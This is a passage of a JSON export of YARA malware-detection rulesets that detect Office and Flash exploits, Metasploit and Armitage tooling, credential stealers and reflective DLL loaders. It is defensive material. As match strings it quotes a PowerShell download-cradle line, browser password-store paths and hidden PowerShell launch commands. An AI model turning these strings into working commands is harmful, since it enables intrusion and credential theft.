Davison\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"rtf_cve2017_11882_ole\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $headers = { 1c 00 00 00 02 00 ?? ?? a9 00 00 00 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? 03 01 01 03 ?? }\n        $font = { 0a 01 08 5a 5a }\n        $winexec = { 12 0c 43 00 }\n\n    condition:\n        all of them and @font > @headers and @winexec == @font + 5 + 44\n}\n\nrule rtf_cve2017_11882 : malicious exploit cve_2017_1182\n{\n    meta:\n        description = \"Exploit for CVE-2017-11882 (Microsoft Office Memory Corruption Vulnerability)\"\n        ref = \"https://embedi.com/blog/skeleton-closet-ms-office-vulnerability-you-didnt-know-about\"\n        classifications = \"Exploit\"\n        threat_names = \"CVE-2017-11882\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"John Davison\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"rtf_cve2017_11882\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $headers = { 31 63 30 30 30 30 30 30  30 32 30 30 ?? ?? ?? ??\n                     61 39 30 30 30 30 30 30  ?? ?? ?? ?? ?? ?? ?? ??\n                     ?? ?? ?? ?? ?? ?? ?? ??  ?? ?? ?? ?? ?? ?? ?? ??\n                     ?? ?? ?? ?? ?? ?? ?? ??  30 33 30 31 30 31 30 33\n                     ?? ?? }\n        $font = { 30 61 30 31 30 38 35 61  35 61 }\n        $winexec = { 31 32 30 63 34 33 30 30 }\n\n    condition:\n        all of them and @font > @headers and @winexec == @font + ((5 + 44) * 2)\n}\n\nrule packager_cve2017_11882\n{\n    meta:\n        description = \"Exploit for CVE-2017-11882 (Microsoft Office Memory Corruption Vulnerability)\"\n        ref = \"https://github.com/rxwx/CVE-2017-11882/blob/master/packager_exec_CVE-2017-11882.py\"\n        classifications = \"Exploit\"\n        threat_names = \"CVE-2017-11882\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Rich Warren\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"packager_cve2017_11882\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $font = { 30 61 30 31 30 38 35 61  35 61 }\n        $equation = { 45 71 75 61 74 69 6F 6E 2E 33 }\n        $package = { 50 61 63 6b 61 67 65 }\n        $header_and_shellcode = /03010[0,1][0-9a-fA-F]{108}00/ ascii nocase\n\n    condition:\n        uint32be(0) == 0x7B5C7274 and all of them\n}\n\nrule rtf_CVE_2018_0802\n{\n    meta:\n        description = \"Exploit for CVE-2018-0802 (Microsoft Office Memory Corruption Vulnerability)\"\n        ref = \"http://www.freebuf.com/vuls/159789.html\"\n        classifications = \"Exploit\"\n        threat_names = \"CVE-2018-0802\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Rich Warren\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"rtf_CVE_2018_0802\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $equation = { 45 71 75 61 74 69 6F 6E 2E 33 }\n        $header_and_shellcode = /03010[0,1][0-9a-fA-F]{308,310}2500/ ascii nocase\n\n    condition:\n        uint32be(0) == 0x7B5C7274 and all of them\n}\n\nrule CVE_2018_4878\n{\n    meta:\n        description = \"Exploit for CVE-2018-4878\"\n        ref = \"https://www.krcert.or.kr/data/secNoticeView.do?bulletin_writing_sequence=26998, https://www.flashpoint-intel.com/blog/targeted-attacks-south-korean-entities/\"\n        classifications = \"Exploit\"\n        threat_names = \"CVE-2018-4878\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Vitali Kremez, Flashpoint\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"crime_ole_loadswf_cve_2018_4878\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $header = \"rdf:RDF\" wide ascii\n        $title = \"Adobe Flex\" wide ascii\n        $pdb = \"F:\\\\work\\\\flash\\\\obfuscation\\\\loadswf\\\\src\" wide ascii\n        $s0 = \"URLRequest\" wide ascii\n        $s1 = \"URLLoader\" wide ascii\n        $s2 = \"loadswf\" wide ascii\n        $s3 = \"myUrlReqest\" wide ascii\n\n    condition:\n        all of ($header*) and all of ($title*) and 3 of ($s*) or all of ($pdb*) and all of ($header*) and 1 of ($s*)\n}\n\nrule Meltdown_Spectre\n{\n    meta:\n        description = \"Exploit for Meltdown/Spectre processor vulnerabilities\"\n        ref = \"https://meltdownattack.com/\"\n        classifications = \"Exploit\"\n        threat_names = \"Meltdown\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"VMRay Labs\"\n\n    strings:\n        $rdtsc_v1 = { 0F 31 0F AE E8 4? 8B ?? 4? 8B ?? 0F AE E8 0F 31 }\n        $rdtsc_v2 = { 0F 31 48 C1 E? ?? 48 3? ?? 4? 8? ?? 4? 8? ?? 48 C1 E? ?? 48 FF 04 ?? 0F AE F0 0F 31 }\n        $rdtscp_v1 = { 0F 01 F9 8? ?? 8? ?? ?? 8? ?? 8? ?? 8? ?? 8? ?? ?? 0F B6 ?? 0F B6 ?? 8? ?? ?? 8? ?? ?? 8? ?? ?? 0F 01 F9 }\n        $rdtscp_v2 = { 0F 01 F9 8? ?? ?? 8? ?? C1 E1 09 8? ?? 0F B6 ?? [0-4] 0F 01 F9 }\n        $rdtscp_v3 = { 0F 01 F9 4C 8D 44 24 ?? 48 C1 E2 20 41 89 08 48 0B C2 4? 8B ?? 4? 8B ?? 89 4C 24 ?? 0F 01 F9 }\n        $rdtscp_v4 = { 0F 01 F9 8? 45 ?? 8? 45 ?? 8? 45 ?? B? 00 00 00 00 0F A2 4? 8B ?? E0 4? 8B ?? 0F 01 F9 }\n        $rdtscp_v5 = { 0F 01 F9 41 89 C5 4? 8B ?? 0F 01 F9 }\n        $rdtscp_go = { E8 AF FC FF FF 48 8B 44 24 08 48 89 44 24 20 48 8B 4C 24 30 48 8D 15 29 CC 0C 00 0F B6 0C 0A 48 8B 9C 24 50 08 00 00 48 89 0B 48 89 1C 24 E8 81 FC FF FF }\n        $clflush = { 0F AE } // this will also catch clflushopt\n\n    condition:\n        any of ($rdtsc*) and $clflush\n}",
      "send_mail": false,
      "shareable": true
    },
    "3": {
      "builtin": true,
      "builtin_name": "Exploit-Kits",
      "created": "2020-05-10 14:25:02.654965",
      "id": 3,
      "modified": "2020-08-27 12:53:30.320129",
      "name": "Exploit-Kits",
      "owner_user_id": null,
      "rules": "\n\nrule Armitage_msfconsole\n{\n    meta:\n        description = \"Armitage component\"\n        classifications = \"Hacktool\"\n        threat_names = \"Armitage, Metasploit, Meterpreter\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Armitage_msfconsole\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"\\\\umeterpreter\\\\u >\" fullword ascii\n        $s3 = \"^meterpreter >\" fullword ascii\n        $s11 = \"\\\\umsf\\\\u>\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x6d5e and filesize < 1KB and (8 of them)) or (all of them)\n}\n\nrule Armitage_OSX\n{\n    meta:\n        description = \"Armitage component\"\n        classifications = \"Hacktool\"\n        threat_names = \"Armitage, Metasploit\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Armitage_OSX\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"resources/covertvpn-injector.exe\" fullword ascii\n        $s10 = \"resources/browserpivot.x64.dll\" fullword ascii\n        $s17 = \"resources/msfrpcd_new.bat\" fullword ascii\n\n    condition:\n        filesize < 6000KB and 1 of them\n}\n\nrule FourElementSword_Config_File\n{\n    meta:\n        description = \"Four Elements Sword: weaponized document builder\"\n        ref = \"https://www.arbornetworks.com/blog/asert/four-element-sword-engagement/\"\n        classifications = \"Hacktool\"\n        threat_names = \"Four Elements Sword\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"FourElementSword_Config_File\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"01,,hccutils.dll,2\" fullword ascii\n        $s1 = \"RegisterDlls=OurDll\" fullword ascii\n        $s2 = \"[OurDll]\" fullword ascii\n        $s3 = \"[DefaultInstall]\" fullword ascii\n        $s4 = \"Signature=\\\"$Windows NT$\\\"\" fullword ascii\n\n    condition:\n        4 of them\n}\n\nrule FourElementSword_T9000\n{\n    meta:\n        description = \"Four Elements Sword: weaponized document builder\"\n        ref = \"https://www.arbornetworks.com/blog/asert/four-element-sword-engagement/\"\n        classifications = \"Hacktool\"\n        threat_names = \"Four Elements Sword\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"FourElementSword_T9000\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"D:\\\\WORK\\\\T9000\\\\\" ascii\n        $x2 = \"%s\\\\temp\\\\HHHH.dat\" fullword wide\n        $s1 = \"Elevate.dll\" fullword wide\n        $s2 = \"ResN32.dll\" fullword wide\n        $s3 = \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\" fullword wide\n        $s4 = \"igfxtray.exe\" fullword wide\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 500KB and 1 of ($x*)) or (all of them)\n}\n\nrule FourElementSword_32DLL\n{\n    meta:\n        description = \"Four Elements Sword: weaponized document builder\"\n        ref = \"https://www.arbornetworks.com/blog/asert/four-element-sword-engagement/\"\n        classifications = \"Hacktool\"\n        threat_names = \"Four Elements Sword\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"FourElementSword_32DLL\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"%temp%\\\\tmp092.tmp\" fullword ascii\n        $s1 = \"\\\\System32\\\\ctfmon.exe\" fullword ascii\n        $s2 = \"%SystemRoot%\\\\System32\\\\\" fullword ascii\n        $s3 = \"32.dll\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 660KB and $x1) or (all of them)\n}\n\nrule FourElementSword_Keyainst_EXE\n{\n    meta:\n        description = \"Four Elements Sword: weaponized document builder\"\n        ref = \"https://www.arbornetworks.com/blog/asert/four-element-sword-engagement/\"\n        classifications = \"Hacktool\"\n        threat_names = \"Four Elements Sword\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"FourElementSword_Keyainst_EXE\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"C:\\\\ProgramData\\\\Keyainst.exe\" fullword ascii\n        $s1 = \"ShellExecuteA\" fullword ascii\n        $s2 = \"GetStartupInfoA\" fullword ascii\n        $s3 = \"SHELL32.dll\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 48KB and $x1) or (all of them)\n}\n\nrule FourElementSword_ElevateDLL_2\n{\n    meta:\n        description = \"Four Elements Sword: weaponized document builder\"\n        ref = \"https://www.arbornetworks.com/blog/asert/four-element-sword-engagement/\"\n        classifications = \"Hacktool\"\n        threat_names = \"Four Elements Sword\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"FourElementSword_ElevateDLL_2\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"Elevate.dll\" fullword ascii\n        $s2 = \"GetSomeF\" fullword ascii\n        $s3 = \"GetNativeSystemInfo\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 25KB and $s1) or (all of them)\n}\n\nrule FourElementSword_fslapi_dll_gui\n{\n    meta:\n        description = \"Four Elements Sword: weaponized document builder\"\n        ref = \"https://www.arbornetworks.com/blog/asert/four-element-sword-engagement/\"\n        classifications = \"Hacktool\"\n        threat_names = \"Four Elements Sword\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"FourElementSword_fslapi_dll_gui\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"fslapi.dll.gui\" fullword wide\n        $s2 = \"ImmGetDefaultIMEWnd\" fullword ascii\n        $s3 = \"RichOX\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 12KB and all of them)\n}\n\nrule FourElementSword_PowerShell_Start\n{\n    meta:\n        description = \"Four Elements Sword: weaponized document builder\"\n        ref = \"https://www.arbornetworks.com/blog/asert/four-element-sword-engagement/\"\n        classifications = \"Hacktool\"\n        threat_names = \"Four Elements Sword\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"FourElementSword_PowerShell_Start\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"start /min powershell C:\\\\\\\\ProgramData\\\\\\\\wget.exe\" ascii\n        $s1 = \"start /min powershell C:\\\\\\\\ProgramData\\\\\\\\iuso.exe\" fullword ascii\n\n    condition:\n        1 of them\n}\n\nrule FourElementSword_ResN32DLL\n{\n    meta:\n        description = \"Four Elements Sword: weaponized document builder\"\n        ref = \"https://www.arbornetworks.com/blog/asert/four-element-sword-engagement/\"\n        classifications = \"Hacktool\"\n        threat_names = \"Four Elements Sword\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"FourElementSword_ResN32DLL\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"\\\\Release\\\\BypassUAC.pdb\" ascii\n        $s2 = \"\\\\ResN32.dll\" fullword wide\n        $s3 = \"Eupdate\" fullword wide\n\n    condition:\n        all of them\n}\n\nrule FourElementSword_ElevateDLL\n{\n    meta:\n        description = \"Four Elements Sword: weaponized document builder\"\n        ref = \"https://www.arbornetworks.com/blog/asert/four-element-sword-engagement/\"\n        classifications = \"Hacktool\"\n        threat_names = \"Four Elements Sword\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"FourElementSword_ElevateDLL\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"Elevate.dll\" fullword wide\n        $x2 = \"ResN32.dll\" fullword wide\n        $s1 = \"Kingsoft\\\\Antivirus\" fullword wide\n        $s2 = \"KasperskyLab\\\\protected\" fullword wide\n        $s3 = \"Sophos\" fullword wide\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 500KB and 1 of ($x*) and all of ($s*)) or (all of them)\n}\n\nrule Metasploit_Loader_RSMudge\n{\n    meta:\n        description = \"Metasploit loader (file: loader.exe)\"\n        ref = \"https://github.com/rsmudge/metasploit-loader\"\n        classifications = \"Hacktool\"\n        threat_names = \"Metasploit\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Metasploit_Loader_RSMudge\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"Could not resolve target\" fullword ascii\n        $s2 = \"Could not connect to target\" fullword ascii\n        $s3 = \"%s [host] [port]\" fullword ascii\n        $s4 = \"ws2_32.dll is out of date.\" fullword ascii\n        $s5 = \"read a strange or incomplete length value\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 200KB and (3 of ($s*))) or (all of them)\n}\n\nrule Invoke_Metasploit\n{\n    meta:\n        description = \"Invoke-Metasploit payload\"\n        ref = \"https://github.com/jaredhaight/Invoke-MetasploitPayload/blob/master/Invoke-MetasploitPayload.ps1\"\n        classifications = \"Hacktool\"\n        threat_names = \"Metasploit\"\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Invoke_Metasploit\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"[*] Looks like we're 64bit, using regular powershell.exe\" ascii wide\n        $s2 = \"[*] Kicking off download cradle in a new process\"\n        $s3 = \"Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;Invoke-Expression $client.downloadstring('''+$url+''');'\"\n\n    condition:\n        (filesize < 20KB and 1 of them)\n}",
      "send_mail": false,
      "shareable": true
    },
    "4": {
      "builtin": true,
      "builtin_name": "Generic",
      "created": "2020-05-10 14:25:02.654965",
      "id": 4,
      "modified": "2020-08-27 12:53:30.323135",
      "name": "Generic",
      "owner_user_id": null,
      "rules": "import \"math\"\nimport \"pe\"\n\nrule CredentialStealer_Generic_Backdoor\n{\n    meta:\n        description = \"Strings that indicate password store access; possible credential stealer\"\n        classifications = \"Spyware\"\n        vti_default_score = 3\n        vti_documents_score = 3\n        vti_scripts_score = 3\n        vti_browser_score = 3\n        vti_msi_score = 3\n        vti_static_score = 3\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CredentialStealer_Generic_Backdoor\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"GetOperaLoginData\" fullword ascii\n        $s2 = \"GetInternetExplorerCredentialsPasswords\" fullword ascii\n        $s3 = \"%s\\\\Opera Software\\\\Opera Stable\\\\Login Data\" fullword ascii\n        $s4 = \"select *  from moz_logins\" fullword ascii\n        $s5 = \"%s\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Login Data\" fullword ascii\n        $s6 = \"Host.dll.Windows\" fullword ascii\n        $s7 = \"GetInternetExplorerVaultPasswords\" fullword ascii\n        $s8 = \"GetWindowsLiveMessengerPasswords\" fullword ascii\n        $s9 = \"%s\\\\Chromium\\\\User Data\\\\Default\\\\Login Data\" fullword ascii\n        $s10 = \"%s\\\\Opera\\\\Opera\\\\profile\\\\wand.dat\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and 4 of them)\n}\n\nrule rc4_init\n{\n    meta:\n        description = \"RC4 algorithm's key scheduling and PRGA\"\n        vti_default_score = 1\n        vti_documents_score = 1\n        vti_scripts_score = 1\n        vti_browser_score = 1\n        vti_msi_score = 1\n        vti_static_score = 1\n        author = \"VMRay Labs\"\n\n    strings:\n        $rc4_init = { 48 89 5C 24 08 48 89 6C 24 10 48 89 74 24 18 57 48 81 EC 00 01 00 00 45 33 C9 48 8D 04 24 48 8B F1 48 8D 1C 24 45 8B D9 48 2B F0 48 8B EA 4C 8B D1 BF 00 01 00 00 41 8B C3 44 88 1C 1E 99 41 FF C3 41 F7 F8 48 63 C2 8A 0C 28 88 0B 48 FF C3 44 3B DF 7C E2 4C 8D 04 24 49 8B D2 4D 2B C2 41 0F B6 04 10 44 0F B6 1A 44 03 C8 45 03 CB 41 81 E1 FF 00 00 80 7D 0D 41 FF C9 41 81 C9 00 FF FF FF 41 FF C1 49 63 C9 42 8A 04 11 88 02 48 FF C2 46 88 1C 11 48 83 EF 01 75 C5 4C 8D 9C 24 00 01 00 00 49 8B 5B 10 49 8B 6B 18 49 8B 73 20 49 8B E3 5F C3 }\n\n    condition:\n        (\n            mime_type == \"application/octet-stream\"\n            or (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550)\n        )\n        and all of them\n}\n\nrule rc4_decrypt\n{\n    meta:\n        description = \"RC4 algorithm's decryption routine\"\n        vti_default_score = 1\n        vti_documents_score = 1\n        vti_scripts_score = 1\n        vti_browser_score = 1\n        vti_msi_score = 1\n        vti_static_score = 1\n        author = \"VMRay Labs\"\n\n    strings:\n        $rc4_decrypt = { 48 89 5C 24 08 48 89 7C 24 10 45 33 D2 4D 63 C0 48 8B FA 4C 8B D9 45 8B CA 4D 85 C0 7E 5E 41 8D 42 01 25 FF 00 00 80 7D 09 FF C8 0D 00 FF FF FF FF C0 4C 63 D0 43 0F B6 1C 1A 44 03 CB 41 81 E1 FF 00 00 80 7D 0D 41 FF C9 41 81 C9 00 FF FF FF 41 FF C1 49 63 C9 42 8A 04 19 43 88 04 1A 42 88 1C 19 43 0F B6 0C 1A 48 03 CB 0F B6 C1 42 8A 0C 18 30 0F 48 FF C7 49 83 E8 01 75 A2 48 8B 5C 24 08 48 8B 7C 24 10 C3 }\n\n    condition:\n        (\n            mime_type == \"application/octet-stream\"\n            or (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550)\n        )\n        and all of them\n}\n\nrule JS_Unicode_escaped_bytes\n{\n    meta:\n        description = \"JavaScript contains many unicode-escaped bytes; possible obfuscation\"\n        vti_default_score = 1\n        vti_documents_score = 1\n        vti_scripts_score = 1\n        vti_browser_score = 1\n        vti_msi_score = 1\n        vti_static_score = 1\n        author = \"VMRay Labs\"\n\n    strings:\n        $s1 = /(\\\\u[0-9a-fA-F]{4}){10}/\n        $s2 = /(\\\\u[0-9a-fA-F]{4}){3}/\n\n    condition:\n        mime_type == \"text/javascript\"\n        and ($s1 or #s2 > 5)\n}\n\nrule JS_Alphanum_text_blob\n{\n    meta:\n        description = \"JavaScript contains large alpha-numeric text blob; possible obfuscation\"\n        vti_default_score = 4\n        vti_documents_score = 4\n        vti_scripts_score = 4\n        vti_browser_score = 4\n        vti_msi_score = 4\n        vti_static_score = 4\n        author = \"VMRay Labs\"\n\n    strings:\n        $s1 = /='[a-z0-9]{200,}'/ nocase\n        $s2 = /=\"[a-z0-9]{200,}\"/ nocase\n\n    condition:\n        mime_type == \"text/javascript\" and any of them\n}\n\nrule ReflectiveLoader\n{\n    meta:\n        description = \"Reflective loader usage\"\n        vti_default_score = 3\n        vti_documents_score = 3\n        vti_scripts_score = 3\n        vti_browser_score = 3\n        vti_msi_score = 3\n        vti_static_score = 3\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"ReflectiveLoader\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"ReflectiveLoader\" fullword ascii\n        $s2 = \"ReflectivLoader.dll\" fullword ascii\n        $s3 = \"?ReflectiveLoader@@\" ascii\n\n    condition:\n        uint16(0) == 0x5a4d and (1 of them or pe.exports(\"ReflectiveLoader\") or pe.exports(\"_ReflectiveLoader@4\") or pe.exports(\"?ReflectiveLoader@@YGKPAX@Z\"))\n}\n\nrule Reflective_DLL_Loader_Aug17_1\n{\n    meta:\n        description = \"Reflective DLL loader\"\n        vti_default_score = 3\n        vti_documents_score = 3\n        vti_scripts_score = 3\n        vti_browser_score = 3\n        vti_msi_score = 3\n        vti_static_score = 3\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Reflective_DLL_Loader_Aug17_1\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"\\\\Release\\\\reflective_dll.pdb\" ascii\n        $x2 = \"reflective_dll.x64.dll\" fullword ascii\n        $s3 = \"DLL Injection\" fullword ascii\n        $s4 = \"?ReflectiveLoader@@YA_KPEAX@Z\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 300KB and (pe.imphash() == \"4bf489ae7d1e6575f5bb81ae4d10862f\" or pe.exports(\"?ReflectiveLoader@@YA_KPEAX@Z\") or (1 of ($x*) or 2 of them))) or (2 of them)\n}\n\nrule DLL_Injector_Lynx\n{\n    meta:\n        description = \"Lynx DLL injector\"\n        threat_names = \"Lynx\"\n        vti_default_score = 3\n        vti_documents_score = 3\n        vti_scripts_score = 3\n        vti_browser_score = 3\n        vti_msi_score = 3\n        vti_static_score = 3\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"DLL_Injector_Lynx\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \" -p <TARGET PROCESS NAME> | -u <DLL PAYLOAD> [--obfuscate]\" fullword wide\n        $x2 = \"You've selected to inject into process: %s\" fullword wide\n        $x3 = \"Lynx DLL Injector\" fullword wide\n        $x4 = \"Reflective DLL Injector\" fullword wide\n        $x5 = \"Failed write payload: %lu\" fullword wide\n        $x6 = \"Failed to start payload: %lu\" fullword wide\n        $x7 = \"Injecting payload...\" fullword wide\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 800KB and 1 of them) or (3 of them)\n}\n\nrule Reflective_DLL_Loader_Aug17_2\n{\n    meta:\n        description = \"Reflective DLL loader\"\n        vti_default_score = 3\n        vti_documents_score = 3\n        vti_scripts_score = 3\n        vti_browser_score = 3\n        vti_msi_score = 3\n        vti_static_score = 3\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Reflective_DLL_Loader_Aug17_2\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"\\\\ReflectiveDLLInjection-master\\\\\" ascii\n        $s2 = \"reflective_dll.dll\" fullword ascii\n        $s3 = \"DLL injection\" fullword ascii\n        $s4 = \"_ReflectiveLoader@4\" fullword ascii\n        $s5 = \"Reflective Dll Injection\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 200KB and (pe.imphash() == \"59867122bcc8c959ad307ac2dd08af79\" or pe.exports(\"_ReflectiveLoader@4\") or 2 of them)) or (3 of them)\n}\n\nrule Reflective_DLL_Loader_Aug17_3\n{\n    meta:\n        description = \"Reflective DLL loader\"\n        vti_default_score = 3\n        vti_documents_score = 3\n        vti_scripts_score = 3\n        vti_browser_score = 3\n        vti_msi_score = 3\n        vti_static_score = 3\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Reflective_DLL_Loader_Aug17_3\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"\\\\Release\\\\inject.pdb\" fullword ascii\n        $s2 = \"!!! Failed to gather information on system processes! \" fullword ascii\n        $s3 = \"reflective_dll.dll\" fullword ascii\n        $s4 = \"[-] %s. Error=%d\" fullword ascii\n        $s5 = \"\\\\Start Menu\\\\Programs\\\\reflective_dll.dll\" ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 300KB and (pe.imphash() == \"26ba48d3e3b964f75ff148b6679b42ec\" or 2 of them)) or (3 of them)\n}\n\nrule Reflective_DLL_Loader_Aug17_4\n{\n    meta:\n        description = \"Reflective DLL loader\"\n        vti_default_score = 4\n        vti_documents_score = 4\n        vti_scripts_score = 4\n        vti_browser_score = 4\n        vti_msi_score = 4\n        vti_static_score = 4\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Reflective_DLL_Loader_Aug17_4\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"<H1>&nbsp;>> >> >> Keylogger Installed - %s %s << << <<</H1>\" fullword ascii\n        $s1 = \"<H3> 